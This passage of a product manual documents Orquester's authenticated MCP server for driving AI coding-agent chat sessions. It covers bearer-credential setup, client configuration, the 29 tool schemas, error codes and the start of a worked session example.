# Orquester MCP — install & use

A guide for an AI agent (or whoever configures one) to connect an MCP client to Orquester's
**MCP server** and drive the agent chat sessions a running Orquester daemon owns.

---

## 1. What it is

The Orquester MCP lets an external agent — a Claude Code session, Claude Desktop, a script — do
through `POST /mcp` what a person does in the chat GUI: open, resume, configure and close chat
sessions of Claude Code (including `claudex`/`claudemix`), Codex, OpenCode and Grok; pick the
model, effort, permission mode, plan mode and account; send messages with images or files and get
the reply back in the same call; answer the agent's questions and tool approvals; read status,
transcripts, subagents and per-turn diffs; wait until a session needs attention; and read quota and
estimated cost. The shared todo lists and sandboxed file reads are there too. That is **29 tools**
(§6).

Apart from the todo and file tools, which use the daemon's todo store and its sandboxed file
reader directly, the tools are a thin in-process client of the daemon's own REST API: every call
goes through the routes the GUI uses, with the same gates and the same error codes, plus a few
stricter checks of the MCP's own (§10). There is **no terminal I/O** — no screen reads, no
keystrokes, no TUI prompt handling. Terminal tabs are listed and can be closed, nothing more.

---

## 2. Prerequisites and endpoint

`/mcp` is a route on the daemon's **HTTP transport**. It is **HTTP-only** and **auth-gated**:

- **It is NOT served on the local unix socket** (the socket is unauthenticated; full session drive
  must require the bearer). A request to `/mcp` over the socket 404s.
- **The HTTP transport must be enabled.** The Electron desktop app embeds the daemon with HTTP
  **off** by default, so `/mcp` targets:
  - a **VPS deployment** (the daemon behind Caddy on `https://<your-domain>/mcp`), or
  - any daemon started with `ORQUESTER_HTTP_ENABLED=true` (then `http://127.0.0.1:47831/mcp`).

Endpoint summary:

| | Value |
|---|---|
| URL (prod) | `https://<your-domain>/mcp` |
| URL (local, HTTP enabled) | `http://127.0.0.1:47831/mcp` |
| Method / transport | `POST` · MCP **Streamable HTTP**, stateless (`enableJsonResponse`); `GET` and `DELETE` answer `405` with `Allow: POST` |
| Required request header | `Accept: application/json, text/event-stream` (MCP client libs set this automatically) |
| Auth | `Authorization: Bearer <credential>` (see §3) |
| Request body | At most 16 MiB (room for inline base64 attachments, §9) |
| Server | `orquester` 2.0.0, with a short `instructions` block for the driving model |

---

## 3. Authentication — derive the bearer once

The credential is **not** the plaintext password. It is:

```
base64( "<username>:<bcrypt(password, salt)>" )
```

where `salt` is the daemon's bcrypt salt (cost 12), fetched from the public
`GET /api/auth/info`. MCP clients can't run bcrypt per-request, so **compute the bearer once**
and paste it into the client config as a static header.

Save this as `compute-bearer.mjs` and run it from the Orquester repo's `apps/daemon` directory
(where `bcryptjs` is already installed) — or in any dir after `npm i bcryptjs`:

```js
// Usage: node compute-bearer.mjs https://your-domain.com <username> '<password>'
import bcrypt from "bcryptjs";

const [baseUrl, username, password] = process.argv.slice(2);
if (!baseUrl || !username || password == null) {
  throw new Error("usage: node compute-bearer.mjs <baseUrl> <username> <password>");
}
const info = await (await fetch(new URL("/api/auth/info", baseUrl))).json();
if (!info.authRequired || !info.salt) {
  throw new Error(`daemon reports authRequired=${info.authRequired} (no salt to derive against)`);
}
const hash = await bcrypt.hash(password, info.salt);          // salt carries the cost (12)
const credential = Buffer.from(`${username}:${hash}`).toString("base64");
console.log(`Authorization: Bearer ${credential}`);
```

```sh
node compute-bearer.mjs https://your-domain.com admin 'your-password'
# → Authorization: Bearer YWRtaW46JDJhJDEyJC4uLg==
```

> **Treat the bearer like the password** — it grants full drive of every session. Store it only in
> your MCP client's secret config. If the daemon password is rotated, the salt changes and you must
> re-derive.

---

## 4. Install into a client

Replace `<URL>` with your endpoint and `<CREDENTIAL>` with the `base64(...)` value from §3.

### Claude Code (CLI)

```sh
claude mcp add --transport http --scope user orquester <URL> \
  --header "Authorization: Bearer <CREDENTIAL>"
```

Verify: `claude mcp list` → `orquester` shows ✓ connected. The tools appear as
`mcp__orquester__list_sessions`, etc.

### Claude Desktop

Recent builds: **Settings → Connectors → Add custom connector**, enter `<URL>` and add the header
`Authorization: Bearer <CREDENTIAL>`.

Older builds (stdio-only) — bridge with `mcp-remote` in `claude_desktop_config.json`:

```json
{
  "mcpServers": {
    "orquester": {
      "command": "npx",
      "args": [
        "-y", "mcp-remote", "<URL>",
        "--header", "Authorization: Bearer <CREDENTIAL>"
      ]
    }
  }
}
```

### Any MCP SDK client

Use the **Streamable HTTP** client transport pointed at `<URL>`, with request header
`Authorization: Bearer <CREDENTIAL>`. (The SDK sets the `Accept` header for you.)

### Verify from a shell (no client needed)

```sh
curl -sS -X POST <URL> \
  -H "Authorization: Bearer <CREDENTIAL>" \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/event-stream' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}'
```

Expect a `200` with the tool list. `401` = bad bearer · `406` = missing the `Accept` header ·
`404` = HTTP transport off / wrong path / you hit the socket · `405` = not a `POST`.

---

## 5. Addressing

Every tool names things the same way:

- **A session is a tab**, addressed by **`sessionId`**: the id `list_sessions` reports (for a chat
  tab it is also the id of its conversation thread). `create_session` returns the new one. There
  is no title matching — titles are not unique.
- **A project** is `project`: either the absolute path `list_projects` reports
  (`"/var/lib/orquester/workspaces/myws/api"`) or the short form `"<workspace>/<project>"`
  (`"myws/api"`). It must name the project directory itself, inside the workspaces sandbox — not a
  workspace and not a directory inside the project (`PROJECT_NOT_FOUND`; outside the sandbox,
  `PATH_NOT_ALLOWED`). Sessions report their project back as `{workspace, name, path}`;
  `workspace`/`name` are `null` for a path that is not `<workspaces>/<workspace>/<project>`.
- **An agent** is a registry id — `claude`, `claudex`, `claudemix`, `codex`, `opencode`, `grok` —
  as `list_agents` lists them for this host.
- **A pending question or approval** is `requestId` (from `get_session`). It may be omitted when
  exactly one request of that kind is pending.
- **A turn** is a 1-based number counting the session's started turns in order; `turnCount` is the
  highest. `get_turn_diff`, `read_transcript` and `revert_session` all count this way.
- **A subagent** is `agentId` (from `get_session`'s `subagents`), **a todo list** is `id`, and **a
  file** is `path` (absolute, or relative to the sandbox root).

Values several tools share:

- **`runtimeMode`** — the permission mode: `approval-required` (Supervised), `auto-accept-edits`
  (Accept edits), `auto` (Auto) or `full-access` (Full access — the default, as in the GUI). It is
  the only thing that decides a chat session's permissions: the registry's terminal launch flags
  never reach a chat launch. On Claude, `full-access` is `bypassPermissions`.
- **`model`** — a slug from `list_agents` (`models[].slug`).
- **`options`** — the model's options as one object, `{"<optionId>": value}`, with the ids and
  values `list_agents` lists under `models[].options` — for example
  `{"effort": "high", "thinking": true}`. `effort` works for every agent: it is mapped to the
  adapter's own id (`effort` on Claude and Codex, `variant` on OpenCode, `reasoningEffort` on
  Grok — `list_agents` reports it as `effortOptionId`), and the real id is accepted too. Effort
  comes only from here, the model selection.
- **`planMode`** — `true` sends one message in plan mode (the composer's plan toggle). It is per
  message, not a session setting.
- **`accountId`** — `"system"` (the daemon's own login) or a managed account id from
  `list_agents` (`accounts[]`); for `claudex`/`claudemix`, only accounts seeded into the model
  proxy.

---

## 6. The tools

Inputs marked `?` are optional; `= x` is the default. Every successful result is **one JSON
object**, returned as `structuredContent` and as the same JSON in a single text block
(`content[0].text`); lists are wrapped (`{"sessions": [...]}`). A tool that changes a session
returns the session's fresh `SessionDetail` under `session`, and commands also return the host's
`seq`, so you see the effect without a second call. `tools/list` gives every tool a title,
annotations (`readOnlyHint` on reads and waits; `destructiveHint` on `close_session`,
`revert_session` and `delete_todo`) and a description of every parameter.

**Errors** come back as `isError: true` with the text `<CODE>: <message>` and
`structuredContent: {code, message, detail?}`; the message names the valid values or the tool that
fixes the problem. Daemon and agent-host codes pass through unchanged (`THREAD_NOT_FOUND`,
`COMMAND_REJECTED`, `COMPACTION_UNAVAILABLE`, `HOST_UNAVAILABLE`, `RESUME_UNAVAILABLE`,
`SESSION_UNAVAILABLE`, `UPLOAD_TOO_LARGE`, `INVALID_COMMAND`, `COMMAND_ID_CONFLICT`, …). The MCP's
own codes are `INVALID_ARGUMENT`, `PROJECT_NOT_FOUND`, `SESSION_NOT_FOUND`, `NOT_A_CHAT_SESSION`,
`PENDING_REQUEST`, `SESSION_BUSY`, `PATH_NOT_ALLOWED` and `INTERNAL`; `INTERNAL` never carries a
path or a stack (the detail is logged on the daemon). A command the agent host refuses with
`HOST_UNAVAILABLE` (it is restarting) is retried with the same command id up to 3 times
(250 ms · 2ⁿ) before the error reaches you.

**Size.** A result is at most 60 000 bytes of UTF-8 JSON (clients such as Claude Code drop larger
MCP results). The tools that could return more bound themselves and say so with
`truncated: true`: `read_transcript` (`maxChars`), `get_turn_diff` (the diff), `get_cost` (rows),
`list_files` (500 entries) and `read_file` (paging). Long texts inside a session view — the plan,
the last reply — are capped at 16 384 characters. As a last resort, a result still too large
gains `truncated: true` and a `truncationNote`.

### Views

Tools that return a session return one of these two shapes.

`SessionView` — every list and wait result:

```
{
  id, kind: "chat" | "terminal",            // terminal = shell tabs and legacy terminal-agent tabs
  agent: <agent id>, adapter?: "claude" | "codex" | "opencode" | "grok",   // adapter on chat only
  title, project: { workspace, name, path }, cwd, createdAt, order,
  status: "working" | "waiting" | "idle",
  attention: "needs-input" | "finished" | "bell" | null,
  needsAttentionAt: ISO | null,
  reason: "approval" | "question" | "plan-ready" | "error" | "starting" | "running"
        | "background-working" | "monitoring" | "completed" | "new" | "exited" | null,
  chat?: { sessionStatus: "idle" | "starting" | "ready" | "running" | "stopped" | "error",
           accountId,                        // "system" for the daemon's own login
           latestTurn: { turnId, state, startedAt, completedAt } | null,
           pending: { approvals: boolean, questions: boolean },
           planReady: boolean, backgroundLiveness: "working" | "monitoring" | null },
  terminal?: { status: "running" | "exited", exitCode?, legacyAgent? }
}
```

`status`, `attention` and `needsAttentionAt` are the daemon's own values — what the tab strip and
the Attention Center show. `reason` says why: the rung of the chat activity ladder the GUI uses,
plus `"new"` for a chat tab that has never run a turn and `"exited"` for an exited terminal.

`SessionDetail` — `get_session`, and every tool that changes a session — is the `SessionView`
plus:

```
chat: { …SessionView.chat,
        model, options: { [id]: string | boolean }, runtimeMode, home: "system" | "account" | "cliproxy",
        accountLabel?, activeTurnId: string | null, turnCount, lastError?, continueAfterRestart: boolean,
        contextWindow?: { usedTokens, maxTokens?, percentUsed?, compactsAutomatically? },
        supports: { planMode, rollback, compaction, backgroundTasks } },
pending: { approvals: PendingApprovalView[], questions: PendingQuestionView[] },
plan?: { planId, markdown /* ≤ 16 384 characters */, truncated, actionable },
subagents: SubagentView[],
lastReply?: { turnId, text /* the main agent's text of the latest settled turn, ≤ 16 384 characters */,
              truncated, completedAt }
```

```
PendingApprovalView = { requestId, kind: "command" | "file-read" | "file-change" | "mcp-elicitation" | "permission",
                        createdAt, detail?, appName?, tool?: { name, input },
                        decisions: [{ decision, label, warning? }] }
                      // decisions = the provider's own options, else the GUI's default four:
                      // accept "Approve", acceptForSession "Always allow this session", decline "Decline", cancel "Cancel"
PendingQuestionView = { requestId, createdAt, turnId?, responseMode: "blocking" | "message", dismissible,
                        questions: [{ index /* 1-based */, id, header, question,
                                      options: [{ label, description, value? }],
                                      multiSelect, allowCustomAnswer, isSecret?, isOther? }] }
SubagentView        = { id, kind, agentKind: "agent" | "background", title, status, model?, effort?,
                        progress?, lastToolName?, startedAt, completedAt, error? }
```

A terminal tab's `get_session` is just its `SessionView`: there is no transcript.

`AgentView` — `list_agents`:

```
{ id: <agent id>, name, adapter, enabled, installed, version, status: "ready" | "degraded" | "error" | "unknown", message?,
  auth: { status: "authenticated" | "unauthenticated" | "unknown", label?, email? },
  models: [{ slug, name, shortName?, isDefault, isLegacy?, providerLabel?,
             options: [{ id, label, type: "select" | "boolean", description?,
                         values?: [{ id, label, description?, isDefault? }] }] }],
  effortOptionId,                                     // "effort" | "variant" | "reasoningEffort"
  runtimeModes: ["approval-required", "auto-accept-edits", "auto", "full-access"], defaultRuntimeMode: "full-access",
  supports: { planMode, rollback, compaction, backgroundTasks, contextWindow },
  accounts: [{ id, label, email, plan, needsReauth, isDefault }],   // { id: "system", label: "System" } first
  defaultAccountId }
```

`enabled` means the agent's CLI was found on this host (`create_session` needs it). For
`claudex`, `models` is the model proxy's launch catalogue, as the `+` menu offers it; `claudemix`
runs the Claude main loop through the proxy, so its `models` are Claude's. For both, `accounts`
are the accounts seeded into the proxy. `models: []` means the catalogue is still being probed —
retry shortly. `auth.status: "unknown"` is not a sign-in problem; only `"unauthenticated"` is.

### Catalogue

| Tool | Input | Returns | GUI equivalent |
|---|---|---|---|
| `list_projects` | `workspace?`, `includeArchived? = false` | `{projects: [{workspace, name, path, isArchived, lastInteractedAt?, openSessions}], warnings?}` | The sidebar's workspaces and projects; the recent-projects list |
| `list_agents` | `agent?`, `includeLegacyModels? = false` | `{agents: AgentView[]}` | The `+` menu and the composer's model, effort, permission and account chips |
| `list_conversations` | `project`, `agent?`, `limit? = 20` (≤ 200) | `{conversations: [{id, agent, title, preview?, updatedAt, home, accountId?, resumable}]}` | The project's conversation history (resume picker) |

- **`list_projects`** — recently used projects first, then the rest alphabetically; `openSessions`
  counts the project's open tabs. Archived workspaces and projects appear only with
  `includeArchived: true`. An unknown `workspace` is refused (`INVALID_ARGUMENT`, naming the
  workspaces); a workspace whose projects cannot be read is left out and named in `warnings`
  rather than failing the whole list.
- **`list_agents`** — only the agents that open as chat tabs. Call it before `create_session` and
  `update_session`: it has every valid model, option value, permission mode and account.
- **`list_conversations`** — the conversations the agent CLIs recorded on disk for this project,
  newest first. `agent` is the agent that resumes the row, and only `resumable: true` rows can be
  passed to `create_session`'s `resume`. An unknown `agent` filter is refused (`INVALID_ARGUMENT`).

### Sessions

| Tool | Input | Returns | GUI equivalent |
|---|---|---|---|
| `list_sessions` | `project?`, `kind? = "all"` (`"chat"` \| `"terminal"` \| `"all"`), `attention? = false` | `{sessions: SessionView[]}` | The tab strip; with `attention: true`, the Attention Center |
| `get_session` | `sessionId` | `{session: SessionDetail}` (a terminal tab: its `SessionView`) | The open chat tab: composer chips, request and plan cards, subagent roster, context meter |
| `get_turn_diff` | `sessionId`, `turn?` (default: the latest turn with a checkpoint) | `{turn, fromTurn, files: [{path, additions, deletions}], diff, truncated}` | A turn's changed-files card |
| `create_session` | `project`, `agent` (required unless `resume`), `model?`, `options?`, `runtimeMode? = "full-access"`, `accountId?`, `title?`, `cwd?`, `resume?: {conversationId}` | `{session: SessionDetail}` | The `+` menu; the resume picker |
| `update_session` | `sessionId`, `title?`, `model?`, `options?`, `runtimeMode?`, `accountId?`, `force? = false` | `{applied: string[], session: SessionDetail}` | The composer's model, effort/option, permission and account chips; renaming the tab |
| `interrupt_session` | `sessionId` | `{seq, session}` | Stop / Esc |
| `stop_session` | `sessionId` | `{seq, session}` | None — the GUI has no control for it |
| `close_session` | `sessionId` | `{closed: true, sessionId}` | Closing the tab |
| `revert_session` | `sessionId`, `keepTurns` | `{seq, session}` | "Rewind the conversation to here" |
| `compact_session` | `sessionId` | `{seq, session}` | "Compact context" |

- **`list_sessions`** — ordered by project, then tab order. With `attention: true`, only the
  sessions whose `attention` is set or whose `status` is `waiting`, newest attention first, as the
  Attention Center orders them.
- **`get_turn_diff`** — the unified diff of what one turn changed; whitespace-only changes are
  ignored, as in the GUI. A turn without a checkpoint (a non-git project, a failed capture) has no
  diff. A diff too large for one result is cut at the end (`truncated: true`); `files` still lists
  every changed file.
- **`create_session`** — every check runs before anything is created, and each refusal names the
  valid values. The project must resolve; the agent must be a chat agent that is `enabled` here;
  `model` must be in its catalogue (default: the catalogue's default model — for `claudex` a model
  the proxy serves, for `claudemix` the Claude catalogue); every `options` id and value must be one
  the model offers; `accountId` must be `"system"` or an account of the agent's family (for
  `claudex`/`claudemix`, one seeded into the proxy) — checked here because the daemon would
  silently fall back to its own login; `cwd` (absolute, or relative to the project; default: the
  project) must be an existing directory inside the sandbox; and the project must have fewer than
  **24** running sessions (`SESSION_BUSY` otherwise — the GUI has no such cap). An omitted
  `accountId` means the family's default account; `claudex` and `claudemix` always launch with an
  explicit one (the seeded default, else `system`). With `resume`, the conversation must be one
  `list_conversations` lists for the project: its row decides the agent (`agent` may be omitted,
  and must match if given) and the default title, and a conversation stored under a managed account
  resumes under that account. `RESUME_UNAVAILABLE` and `SESSION_UNAVAILABLE` pass through with the
  daemon's message (a conversation already open in another tab arrives as `SESSION_UNAVAILABLE`).
  If the tab was created but could not be read back, the error's `detail` carries `sessionId` and
  `created: true`: use that id and do not create again. The first message is a separate
  `send_message`.
- **`update_session`** — one call for everything on the composer bar except plan mode, which is
  per message. `options` are merged onto the session's current ones (setting `effort` keeps
  `thinking`), and options the new model does not offer are dropped, as the composer does. Model,
  options and permission mode are applied by one host command. A real change to any of them while
  a turn is starting or running is refused with `SESSION_BUSY` unless `force: true`, because it
  restarts the agent session and cuts the turn (the GUI lets such a change cut the turn; the MCP
  deliberately does not). Invalid values are refused with `INVALID_ARGUMENT` even mid-turn, and
  fields that already hold the requested value are skipped, so repeating a call is harmless
  (`applied: []`).
  An account switch takes effect on the next message and needs an idle session — no turn, no
  pending request, no background work (`SESSION_BUSY` otherwise); OpenCode has no per-session
  account. If a write fails after others landed, the error's `detail` carries `applied`.
- **`interrupt_session`** — interrupts the running turn (its pending requests are cancelled); with
  no turn running, stops every live subagent, background shell and watch loop.
- **`stop_session`** — stops the provider process but keeps the tab, its history and its resume
  cursor; the next `send_message` resumes the conversation. A session in `error` refuses messages
  and every other command except `revert_session`, so this is how you recover it.
- **`close_session`** — closes a chat or a terminal tab. A chat tab's Orquester thread (its event
  log) is deleted; the provider's own transcript survives and stays resumable through
  `list_conversations`. A terminal tab's command is killed with it.
- **`revert_session`** — keeps the first `keepTurns` started turns and drops the rest
  (`0 ≤ keepTurns < turnCount`). Conversation only — files are not restored. Refused with
  `INVALID_ARGUMENT` for an agent without rollback (Grok), and with `SESSION_BUSY` while a turn is
  active.
- **`compact_session`** — asks the agent to compact its context window. The host refuses while a
  turn runs (`COMPACTION_UNAVAILABLE`) and on an empty conversation (`COMMAND_REJECTED`).

### Messages

| Tool | Input | Returns | GUI equivalent |
|---|---|---|---|
| `send_message` | `sessionId`, `text?`, `attachments?` (≤ 8, §9), `planMode? = false`, `wait? = true`, `timeoutMs? = 120000` (1 000–600 000) | `{seq, outcome, turnId?, reply?, replyTruncated?, pending?, session}` | The composer's Send (Enter during a turn steers it) |
| `implement_plan` | `sessionId`, `wait? = true`, `timeoutMs? = 120000` (1 000–600 000) | Same as `send_message` | The plan card's **Implement** button |
| `read_transcript` | `sessionId`, `turns? = 3` (≤ 200), `agentId?`, `include? = ["tools", "activity"]` (add `"reasoning"`), `maxChars? = 40000` (2 000–55 000) | `{entries: TranscriptEntry[], turnCount, coveredTurns: [from, to] \| null, truncated, subagents: [{id, title, status}], hint?}` | The chat timeline; a subagent's drill-in |

- **`send_message`** — needs `text` (at most 120 000 characters after trimming) or at least one
  attachment. It is refused with `PENDING_REQUEST` while a question or an approval is open — the
  message names each one and the tool that answers it, like the GUI's "answer the request above
  first" — and with `SESSION_BUSY` while the session is in `error` (`stop_session` first).
  `planMode: true` needs an agent with the plan toggle (`supports.planMode`); OpenCode's plan agent
  is a model option instead, `update_session {options: {"agent": "plan"}}`. Attachments are
  validated and uploaded first; a refused one fails the call before anything is sent. While a turn
  is running, the message **steers** it (as Enter does mid-turn in the GUI) and `turnId` is that
  turn's. `wait: false` returns `outcome: "sent"` with the receipt. `wait: true` blocks as §8
  describes and returns the `outcome`; once the turn has settled, `reply` — the main agent's text
  from the turn this message started or steered, never an earlier turn's (at most 16 384
  characters; `replyTruncated: true` when cut, and `read_transcript` has the rest); and `pending`
  while a question or an approval is open. When `reply` is present, `session.lastReply` is left
  out: it is the same text.
- **`implement_plan`** — sends exactly what the GUI's Implement button sends: the line
  `PLEASE IMPLEMENT THIS PLAN:` followed by the latest proposed plan, in default (not plan) mode.
  A plan too long for the thread snapshot (`plan.truncated: true`) is read back in full first; a
  cut plan is never sent. Refused with `INVALID_ARGUMENT` when there is no proposed plan or the
  latest one was already sent for implementation, and with `PENDING_REQUEST` while a request is
  open. To refine a plan instead (the Refine button), use `send_message {planMode: true, text}`.
- **`read_transcript`** — built from the same thread snapshot the GUI renders. `turns` counts back
  from the latest turn, and `coveredTurns` says which turns are included. Without `agentId` you get
  the parent view, the GUI's timeline: the main agent's rows plus one `subagent` row per subagent.
  With `agentId`, only that subagent's own rows (its drill-in). `maxChars` is a budget for the
  whole result, measured — despite its name — in UTF-8 bytes of the result's JSON. Over it, rows
  are shed in a fixed order: reasoning, then tool detail, then the oldest turns, then the newest
  turn's oldest rows (the final reply is kept, cut if it must be); the result then says
  `truncated: true` and carries a `hint`.

```
TranscriptEntry = { turn: number | null, turnId: string | null, kind, createdAt, agentId?, …by kind:
  "user"         text, attachments?: [{ name, type }]
  "assistant"    text
  "reasoning"    text                                                       (include "reasoning")
  "tool"         tool: { type, title, status, command?, detail?, changedFiles? }
                                                  (include "tools"; one entry per tool call, its latest state)
  "approval"     requestId, requestKind?, text? /* the request's detail */, decision?
                                                  (include "activity"; open or resolved)
  "question"     requestId, questions?: [text], answered                    (include "activity")
  "subagent"     subagent: { id, title, status }                            (parent view only)
  "plan"         text /* the plan's markdown */, actionable
  "changes"      files: [{ path, additions, deletions }]    (one per turn, from its checkpoint; parent view only)
  "compaction"   state, beforeTokens?, afterTokens?                         (include "activity")
  "error" | "warning" | "info"   text                                       (include "activity") }
```

### Requests

| Tool | Input | Returns | GUI equivalent |
|---|---|---|---|
| `answer_question` | `sessionId`, `requestId?`, `answers: {<question id or index>: string \| string[]}`, `attachments?: {<question id or index>: Attachment[]}` | `{seq, session}` | The question card's Submit |
| `dismiss_question` | `sessionId`, `requestId?` | `{seq, session}` | The question card's Dismiss |
| `resolve_approval` | `sessionId`, `requestId?`, `decision` (`"accept"` \| `"acceptForSession"` \| `"acceptAlways"` \| `"decline"` \| `"cancel"`) | `{seq, session}` | The approval card's Approve / Decline and its overflow menu |

- `requestId` may be omitted when exactly one request of that kind is pending; otherwise the error
  lists the pending ids.
- **`answer_question`** — answers every question of the request at once (the GUI requires all of
  them before Submit). Keys are the question `id`s `get_session` reports, or their 1-based `index`
  (an exact id wins); on Claude a question's `id` is its full text, so the index is usually
  simpler. A single-select question takes a string; a `multiSelect` question takes an array (one
  option may be given as a plain string). A string that matches an option's `label` or `value`
  (exactly, else ignoring case) selects that option; any other string is sent as the custom answer
  where the question allows one (`allowCustomAnswer`). Attachments (§9) are accepted on questions
  that take a custom answer and are not secret, and files alone answer a question (pass `""` as its
  answer). Everything is validated before anything is uploaded or sent, and the problems are
  reported together; all the files of all the questions are validated and uploaded as one batch,
  so a bad file anywhere uploads nothing, and the error names the question and the file
  (`Attachments for "<question>": attachments[i]: …`). A Codex async question
  (`responseMode: "message"`) is answered the same way: the host turns the answer into a user
  message that repeats each question before its answer, which steers or starts a turn.
- **`dismiss_question`** — closes a question without answering it. Only an async question
  (`responseMode: "message"`, `dismissible: true`) can be dismissed; a blocking one is refused —
  answer it, or `interrupt_session`.
- **`resolve_approval`** — `decision` must be one of the request's `decisions` (`get_session`
  lists them with their labels and any warning). Two provider quirks, which the GUI shows as
  warnings: on Claude, `acceptAlways` denies (a permanent permission cannot be granted from here);
  on OpenCode, `acceptForSession` and `acceptAlways` both mean "always" for the whole project
  directory, across every OpenCode session of that project.

### Waiting

| Tool | Input | Returns | GUI equivalent |
|---|---|---|---|
| `wait_for_session` | `sessionId?` or `project?` (neither: every session), `after?` (ISO time; default: now), `timeoutMs? = 120000` (1 000–600 000) | `{sessions: SessionView[], cursor, timedOut}` | The Attention Center |

Blocks until a watched session needs attention after `after`; §8 has the rules and the cursor
contract. Passing both `sessionId` and `project` is refused.

### Usage

| Tool | Input | Returns | GUI equivalent |
|---|---|---|---|
| `get_usage` | `refresh? = false` | `UsageView` | The top-bar usage widget |
| `get_cost` | `days? = 7` (1–90) | `{asOf, days, totalUsd, byDay: [{day, usd}], rows: [{agent, model, day, inputTokens, outputTokens, cacheReadTokens, cacheWriteTokens, costUsd}], truncated?, rowsDropped?}` | The usage widget's Cost tab |

- **`get_usage`** — quota per agent family (Claude, Codex, Grok) and per managed account, row for
  row as the widget shows it: the 5-hour, weekly and per-model windows (e.g. Fable) as **% used**, with
  reset times. An absent family is not signed in; `stale: true` with no `asOf` means "signed in, no
  reading yet"; freshness is per row (`asOf`, `ageMinutes`). `refresh: true` asks the daemon to
  re-fetch but may still return last-known data (upstream backoff) — never call it in a loop.
- **`get_cost`** — an API-equivalent cost estimate from the local transcripts, per agent, model and
  UTC day, for the last `days` days including today. `byDay` runs oldest to newest; `rows` are
  newest day first. Amounts are rounded to 4 decimals. A model without a known price counts as $0
  in `byDay` and `totalUsd`, and its rows carry `costUsd: null`. The result bounds itself to
  50 000 bytes by dropping whole days of rows, oldest first (`truncated: true`, `rowsDropped`);
  `byDay` and `totalUsd` still count every row.

```
UsageView   = { agents: [{ id: "claude" | "codex" | "grok", name: "Claude Code" | "Codex" | "Grok Build",
                           available, stale, asOf?, ageMinutes?, plan?,
                           accounts: UsageRow[],              // one per managed account
                           system?: UsageRow,                 // the daemon's own login
                           windows?: UsageWindow[],           // only when there is neither an account row nor a system row
                           aggregate?: { strategy, accountCount, staleAccountCount? } }] }
UsageRow    = { id, label, plan?, available, stale, asOf?, ageMinutes?, needsReauth?, email?, windows: UsageWindow[] }
UsageWindow = { id: "session" | "weekly" | "scoped:<label>", label: "5h" | "Week" | <label>,
                percentUsed, resetsAt?, resetsIn? /* "4h 44m" */ }
```

### Files

| Tool | Input | Returns | GUI equivalent |
|---|---|---|---|
| `list_files` | `path` | `{path, entries: [{name, kind: "dir" \| "file" \| "symlink" \| "other", size}], truncated}` | The file browser |
| `read_file` | `path`, `offset? = 0`, `maxBytes? = 65536` (≤ 262 144) | `{path, text, size, offset, truncated}` | Opening a file in the editor |

Both work inside the workspaces sandbox: `path` is absolute or relative to the sandbox root, and
anything outside it is `PATH_NOT_ALLOWED`. `list_files` returns at most 500 entries, sorted by name
(`truncated: true` beyond). `read_file` pages by byte offset: `truncated: true` means there is
more — read again with `offset` advanced by `maxBytes`. Binary files are refused.

### Todos

| Tool | Input | Returns | GUI equivalent |
|---|---|---|---|
| `list_todos` | `workspace?` or `project?` (exactly one) | `{todos: Todo[]}` | The Todo tab |
| `create_todo` | `workspace?` or `project?` (exactly one), `name` | `{todo: Todo}` | Adding a list |
| `update_todo` | `id`, `name?`, `body?` | `{todo: Todo}` | Renaming or editing a list |
| `delete_todo` | `id` | `{deleted: true, id}` | Deleting a list |
| `toggle_todo_item` | `id`, `item` (its text, or its 1-based index), `checked?` (omit to flip) | `{id, item, checked, body}` | Ticking one checkbox |

`Todo = {id, name, scope: "workspace" | "project", body, createdAt, updatedAt}`. A list belongs to
a workspace (`workspace`, by name) or to a project (`project`, a path or `"workspace/project"` as
everywhere else). `body` is GitHub task-list markdown (`- [ ] item`); a new list starts empty, and
`update_todo` replaces the whole body. To tick one item use `toggle_todo_item`: it is atomic, so it
cannot clobber an edit made in the meantime; an `item` given as text must match a whole item,
ignoring case. The human sees every change live in the Todo tab.

---

## 7. Workflows

Calls are written as `tool { arguments }` → result. Ids, paths and timestamps are illustrative,
and `/* … */` marks parts left out.

### (a) Open a Claude session, send a message, read the reply

```jsonc
// 1. The valid models, options, permission modes and accounts for Claude on this host.
list_agents { "agent": "claude" }
→ { "agents": [ {
      "id": "claude", "name": "Claude Code", "adapter": "claude",
      "enabled": true, "installed": true, "version": "2.1.3", "status": "ready",
      "auth": { "status": "authenticated" },
      "models": [
        { "slug": "default", "name": "Default (recommended)", "isDefault": true, "options": [ /* … */ ] },
        { "slug": "opus", "name": "Opus", "shortName": "Opus", "isDefault": false,
          "options": [
            { "id": "effort", "label": "Effort", "type": "select",
              "description": "How much reasoning the model spends on a turn.",
              "values": [ { "id": "low", "label": "Low" }, { "id": "medium", "label": "Medium", "isDefault": true },
                          { "id": "high", "label": "High" }, { "id": "max", "label": "Max" } ] },
            { "id": "thinking", "label": "Thinking", "type": "boolean",
              "description": "Show the model's summarised reasoning." } ] }
        /* … */ ],
      "effortOptionId": "effort",
      "runtimeModes": [ "approval-required", "auto-accept-edits", "auto", "full-access" ],
      "defaultRuntimeMode": "full-access",
      "supports": { "planMode": true, "rollback": true, "compaction": true, "backgroundTasks": true, "contextWindow": true },
      "accounts": [ { "id": "system", "label": "System", "email": null, "plan": null, "needsReauth": false, "isDefault": true } ],
      "defaultAccountId": "system" } ] }

// 2. Open a tab: Opus at high effort, accepting edits without asking.
create_session { "project": "myws/api", "agent": "claude", "model": "opus",
                 "options": { "effort": "high" }, "runtimeMode": "auto-accept-edits" }
→ { "session": {
      "id": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "kind": "chat", "agent": "claude", "adapter": "claude",
      "title": "Claude Code",
      "project": { "workspace": "myws", "name": "api", "path": "/var/lib/orquester/workspaces/myws/api" },
      "cwd": "/var/lib/orquester/workspaces/myws/api", "createdAt": "2026-09-23T10:00:00.000Z", "order": 2,
      "status": "idle", "attention": null, "needsAttentionAt": null, "reason": "new",
      "chat": {
        "sessionStatus": "idle", "accountId": "system", "latestTurn": null,
        "pending": { "approvals": false, "questions": false }, "planReady": false, "backgroundLiveness": null,
        "model": "opus", "options": { "effort": "high" }, "runtimeMode": "auto-accept-edits", "home": "system",
        "accountLabel": "System", "activeTurnId": null, "turnCount": 0, "continueAfterRestart": false,
        "supports": { "planMode": true, "rollback": true, "compaction": true, "backgroundTasks": true } },
      "pending": { "approvals": [], "questions": [] },
      "subagents": [] } }

// 3. Ask. wait:true is the default: the call returns when the turn settles.
send_message { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33",
               "text": "Why does `pnpm check` fail in packages/api? Answer in three sentences." }
→ { "seq": 12, "outcome": "completed", "turnId": "0c5d2e8f-1a7b-4c3d-9e6f-8b2a4d1c7e90",
